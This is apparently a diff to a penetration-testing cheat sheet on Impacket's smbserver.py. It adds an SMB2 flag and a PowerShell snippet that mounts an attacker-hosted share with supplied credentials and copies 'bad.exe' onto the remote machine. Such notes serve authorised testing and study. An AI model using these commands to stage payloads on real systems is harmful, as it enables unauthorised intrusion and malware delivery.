@@ -129,7 +129,7 @@ This is useful in the situation where the target machine does NOT have a writeab
 ## smbserver.py
 Host a Python implementation of an SMB server. Allows to quickly set up shares and user accounts
 ```bash
-smbserver.py $SHARENAME /path/to/your/local/share
+smbserver.py $SHARENAME /path/to/your/local/share -smb2support
 smbserver.py $SHARENAME /path/to/your/local/share --username $user --password 
 $password
 ```
@@ -142,6 +142,12 @@ On remote:
 $pass = convertto-securestring 'pass' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('user', $pass)
 New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
+```
+
+```powershell
+copy \\$ip\$Sharename\bad.exe
+# Move into Share
+cd $Share:
 ```
 
 ## ticketer
